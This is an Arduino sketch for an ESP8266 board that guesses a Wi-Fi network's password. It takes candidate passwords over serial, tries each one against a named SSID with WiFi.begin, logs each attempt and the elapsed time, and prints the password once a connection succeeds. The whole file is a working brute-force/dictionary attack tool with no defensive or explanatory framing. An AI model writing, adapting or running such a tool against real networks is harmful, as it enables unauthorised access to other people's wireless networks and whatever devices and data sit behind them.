#include <ESP8266WiFi.h>        // Include the Wi-Fi library
//#include <ESP8266WiFiMulti.h>   // Include the Wi-Fi-Multi library

#define MAX_MESSAGE 30

const char* ssid = "testNetwork"; //Enter SSID
const char* password = "password"; //Enter Password
char strValue[10];
int itNum = 0;
int ind = 0;
int seconds = 0;

String inputString = "";         // a String to hold incoming data
bool stringComplete = false;  // whether the string is complete

void setup(void)
{ 
  Serial.begin(115200);
  Serial.print("clearing");
  Serial.flush();
while (WiFi.status() != WL_CONNECTED) 
  {
  static char buffer[MAX_MESSAGE];
  static unsigned char index = 0;
  char inch;
 
  while (Serial.available() > 0) {
    inch = Serial.read();
    if (inch == ';') {
      Serial.print("You entered: ");
      Serial.print(buffer);
      Serial.print('\n');
      password = buffer;


    Serial.print("targeting ");
    Serial.print(ssid);
    Serial.print('\n');
    Serial.print("trying password number ");
    Serial.print((itNum+1));
    Serial.print(": ");
    Serial.print(password);
    Serial.print('\n');
    Serial.print("seconds elapsed: ");
    Serial.print(seconds);
    Serial.print('\n');
    itNum++;
    
    WiFi.begin(ssid, password);
    delay(16850);
    seconds += 17;

      
      buffer[0] = 0;
      index = 0;
    } else {       
      if (index < MAX_MESSAGE-1) {
        buffer[index++] = inch;
        buffer[index] = 0;
      }
    }
  }

    
  }
  Serial.print('\n');
  Serial.print("WiFi connection Successful, taking about ");
  Serial.print(seconds);
  Serial.print(" seconds");
  Serial.print('\n');
  Serial.print("The IP Address of this ESP8266 Module is: ");
  Serial.print(WiFi.localIP());// Print the IP address
  Serial.print('\n');
  Serial.print("The WiFi password for the network ");
  Serial.print(ssid);
  Serial.print(" is ");
  Serial.print(password);

  Serial.print('\n');
  Serial.print('\n');
  Serial.print('\n');
  Serial.print("More Information:");
  Serial.print('\n');
  WiFi.printDiag(Serial);
}


void loop() 
{

}
